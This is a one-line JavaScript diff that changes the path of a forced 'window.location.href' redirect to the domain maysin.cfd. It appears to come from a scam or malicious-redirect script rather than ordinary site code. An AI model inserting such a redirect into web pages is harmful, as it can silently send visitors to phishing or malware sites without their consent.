@@ -1,1 +1,1 @@
-window.location.href = "https://maysin.cfd/povG/go?sid=7747";
+window.location.href = "https://maysin.cfd/IKz/go?sid=7747";
